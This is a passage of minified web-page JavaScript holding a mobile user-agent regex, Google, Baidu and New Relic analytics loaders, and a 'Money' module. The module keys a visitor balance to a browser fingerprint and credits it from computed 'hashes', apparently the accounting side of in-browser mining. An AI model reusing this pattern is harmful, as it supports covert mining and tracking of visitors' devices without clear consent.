)|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4)))&&(check=!0),check}function addAnalytics(){var i,s,o,r,a,m;i=window,s=document,o="script",r="ga",i.GoogleAnalyticsObject=r,i.ga=i.ga||function(){(i.ga.q=i.ga.q||[]).push(arguments)},i.ga.l=1*new Date,a=s.createElement(o),m=s.getElementsByTagName(o)[0],a.async=1,a.src="https://www.google-analytics.com/analytics.js",m.parentNode.insertBefore(a,m),ga("create","UA-105323849-1","auto"),ga("send","pageview");!function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?8b3f6e2c94f875da6eedafba4337f6c1";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)}(),window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){return r(t[e][1][n]||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,-1!==o.indexOf("dev")&&(s.dev=!0),-1!==o.indexOf("nr_dev")&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function o(t,n){var e=n?null:c.now();i("err",[t,e])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=t("gos"),u=window.onerror,d=!1,l="nr@seenError",p=0;c.features.err=!0,t(1),window.onerror=function(t,n,e,r,s){try{p?p-=1:o(s||new function(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}(t,n,e),!0)}catch(f){try{i("ierr",[f,c.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))};try{throw new Error}catch(h){"stack"in h&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),d=!0)}s.on("fn-start",function(t,n,e){d&&(p+=1)}),s.on("fn-err",function(t,n,e){d&&!e[l]&&(f(e,l,function(){return!0}),this.thrown=!0,o(e))}),s.on("fn-end",function(){d&&!this.thrown&&p>0&&(p-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){t[0]instanceof b&&(this.bstStart=g.now())}),o.on(w,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(18)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){var n={object:function(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)},function:e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(18)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(18)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){var i=t("ee").get("timer"),a=t(18)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+"-"),a.inPlace(window,[c],c+"-"),a.inPlace(window,[f,"clearImmediate"],f+"-"),i.on(c+u,function(t,n,e){t[0]=a(t[0],"fn-",null,e)}),i.on(s+u,function(t,n,e){this.method=e,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,e)})},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,y,"fn-",s)}function a(){for(var t=0;t<g.length;t++)r(0,g[t]);g.length&&(g=[])}function s(t,n){return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(18)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,w=l.SI,v="readystatechange",y=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];n.exports=u;var b=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(v,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(function(t,n){for(var e in t)n[e]=t[e]}(p,b),b.prototype=p.prototype,d.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(0,n),function(t){g.push(t),h&&(x?x.then(a):w?w(a):(E=-E,O.data=E))}(n)}),u.on("open-xhr-start",r),h){var x=m&&m.resolve();if(!w&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===v||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=function(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},function(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;void 0===window.newrelic&&(newrelic=u);var l="api-",p=l+"ixn-";a(["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],e),t}finally{c.emit("fn-end",[f.now()],e)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){var o=Object.prototype.hasOwnProperty;n.exports=function(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}},{}],16:[function(t,n,e){n.exports=function(t,n,e){n||(n=0),void 0===e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}},{}],17:[function(t,n,e){n.exports={exists:void 0!==window.performance&&window.performance.timing&&void 0!==window.performance.timing.navigationStart}},{}],18:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,function(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o])}(t,nrWrapper),nrWrapper)}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=function(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)r(a=t[s=n[c]])||(t[s]=e(a,f?s+o:o,i,s))},e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(15),u={},d={},l=n.exports=function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=h(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[e]];return d&&d.push([g,e,r,a]),a}}function h(t){return v[t]||[]}var v={},y={},g={on:function(t,n){v[t]=h(t).concat(n)},emit:e,get:function(t){return d[t]=d[t]||o(e)},listeners:h,context:n,buffer:function(t,n){f(t,function(t,e){n=n||"feature",y[e]=n,n in u||(u[n]=[])})},abort:a,aborted:!1};return g}();l.backlog=u},{}],gos:[function(t,n,e){var o=Object.prototype.hasOwnProperty;n.exports=function(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){var o=1,i="nr@id",a=t("gos");n.exports=function(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}},{}],loader:[function(t,n,e){function r(){if(!x++){var t=b.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(y,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+b.offset],null,"api");var e=l.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(15),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,w=m&&m.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},g=m&&w&&w[p]&&!/CriOS/.test(navigator.userAgent),b=n.exports={offset:s,now:a,origin:v,features:{},xhrWrappable:g};t(12),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",function(){"complete"===l.readyState&&i()}),d[h]("onload",r)),c("mark",["firstbyte",s],null,"api");var x=0,E=t(17)},{}]},{},["loader",2,10,4,3]),NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"ae35d55cb6",applicationID:"118478072",sa:1}}function dedent(strings,...values){for(var result="",i=0;i<strings.length;i++)values&&values[i]?result+=strings[i].replace(/\n\s+/g,"\n")+values[i]:result+=strings[i].replace(/\n\s+/g,"\n");return result}function Money(){var _money={init:function(){return _money.fp=(new Fingerprint).get(),_money.num=Number(localStorage.getItem(_money.fp)),null===localStorage.getItem(_money.fp)&&(_money.num=10,localStorage.setItem(_money.fp,_money.num)),_money.setD(_money.num),_money},setD:function(num){num=num.toFixed(isInt(num)?0:4);var moneyD=document.getElementById("money"),html=dedent`<span class="account" title="${config.accountTitle.lang()} ${_money.fp}">${config.accountTitle.lang()}${_money.fp}</span>
      <span class="balance">${config.balance.lang()}${num}${config.balanceCredit.lang()}</span>`;moneyD.innerHTML=html},save:function(){localStorage.setItem(_money.fp,_money.num+_money.hashMoney)},setHash:function(hashes){_money.hashMoney=hashes/1e4,_money.setD(_money.num+_money.hashMoney),_money.save()}};return _money.init()}function isInt(value){return!isNaN(value)&&parseInt(Number(value))==value&&!isNaN(parseInt(value,10))}String.prototype.format=function(){var args=arguments;return this.replace(/\{(\d+)\}/g,function(m,i){return args[i]})},Array.prototype.move=function(old_index,new_index){if(new_index>=this.length)for(var k=new_index-this.length;1+k--;)this.push(void 0);return this.splice(new_index,0,this.splice(old_index,1)[0]),this},Object.prototype.lang=function(){return this[config.userLang]||this.default};